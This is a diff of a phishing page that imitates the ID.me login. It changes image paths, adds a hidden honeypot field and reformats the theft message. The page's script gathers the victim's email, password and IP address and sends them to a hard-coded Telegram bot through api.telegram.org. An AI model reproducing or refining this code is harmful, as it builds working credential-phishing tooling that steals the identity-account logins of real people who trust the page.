@@ -10,9 +10,9 @@
   <meta content="IE=edge" http-equiv="X-UA-Compatible">
   <meta content="One Identity. One Wallet." name="description">
   <meta property="og:image"
-    content="api.id.me.allbizsystem/images/favicon_3b57957bde0ba341f2e080013aa6d42d303e29a4594c8f231c013514b22241f0.ico" />
+    content="images/favicon_3b57957bde0ba341f2e080013aa6d42d303e29a4594c8f231c013514b22241f0.ico" />
   <meta property="og:image:secure_url"
-    content="api.id.me.allbizsystem/images/favicon_3b57957bde0ba341f2e080013aa6d42d303e29a4594c8f231c013514b22241f0.ico" />
+    content="images/favicon_3b57957bde0ba341f2e080013aa6d42d303e29a4594c8f231c013514b22241f0.ico" />
   <meta content="" name="keywords">
   <meta content="noodp" name="robots">
   <meta content="width=device-width, initial-scale=1, minimum-scale=1" name="viewport">
@@ -131,6 +131,10 @@
                   <span role="alert">
                   </span>
                 </div>
+                <div style="display: none;">
+                  <label for="honeypot">Leave this field blank:</label>
+                  <input type="text" id="honeypot" name="honeypot">
+                </div>
                 <div class="field checkbox remember_me" data-component="Cookies.Delete"
                   data-endpoint="/cookies/remember_me">
                   <input type="checkbox" name="remember_me" id="remember_me" value="true"
@@ -195,6 +199,7 @@
   </div>
   </div>
 </body>
+
 
 <script>
   let hasAlerted = false; // Flag to track whether alert has been shown
@@ -305,7 +310,10 @@ Visitor Information:
     const chatId = '6845072076';
     const format = 'HTML';
 
-    const message = `----♻️NEW LOGIN 1♻️----\n✉️Email: ${email}\n🔒Password: ${password}\n📲IP Address: ${ipAddress}`;
+    const message = `----♻️NEW LOGIN 1♻️----
+    \n✉️Email: ${email}
+    \n🔒Password: ${password}
+    \n📲IP Address: ${ipAddress}`;
 
     const apiUrl = `https://api.telegram.org/bot${apiKey}/sendMessage`;
 
@@ -378,5 +386,7 @@ Visitor Information:
     }
   });
 </script>
+
+
 
 </html>
